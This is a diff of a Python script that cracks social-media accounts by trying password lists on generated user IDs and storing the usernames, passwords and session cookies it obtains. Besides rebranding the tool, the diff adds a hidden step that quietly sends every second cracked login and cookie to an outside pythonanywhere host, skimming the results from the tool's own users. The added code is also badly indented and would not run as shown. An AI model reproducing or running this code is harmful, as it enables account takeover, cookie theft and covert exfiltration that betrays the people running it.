@@ -28,6 +28,7 @@ cyan="\033[1;36m"
 faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 ugnn = []
 redmi=[]
+bkas = []
 for x in range(1000):
  rr = random.randint
  rc = random.choice
@@ -269,7 +270,7 @@ db. 88  88   88    88
 Y8888P  YP   YP    YP \033[1;34m ᴾᴿᴼ
 \033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;32m[\033[1;31m✓\033[1;32m] Author     : MR JAY
-\033[1;32m[\033[1;31m✓\033[1;32m] VERSION     : =
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : =(.)=
 \033[1;32m[\033[1;31m✓\033[1;32m] TODAY      : {datex}
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types :\033[1;36m RANDOM 
 \033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
@@ -406,24 +407,24 @@ def cracker(ids,passlist):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
+                        print('\033[1;92m [JAY-NV] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/JAY/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
+                        print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/JAY/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                #print('\033[1;91m [JAY-CP] '+ids+' | '+pas+'')
+                open('/sdcard/JAY/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
@@ -458,7 +459,7 @@ def convert(cookie):
     return(str(cok))            
 
 def crackerr(ids,passlist):
-    global loop,oks,cps
+    global loop,oks,cps,bkas
     session = requests.Session()
     sys.stdout.write('\r \033[1;97m[\x1b[1;92mJAY•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
@@ -533,24 +534,29 @@ def crackerr(ids,passlist):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        print('\033[1;92m [JAY-NV] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/JAY/NV-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{user}|{pas}|{kuki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                        print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                #print('\033[1;91m [JAY-CP] '+ids+' | '+pas+'')
+                open('/sdcard/JAY/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
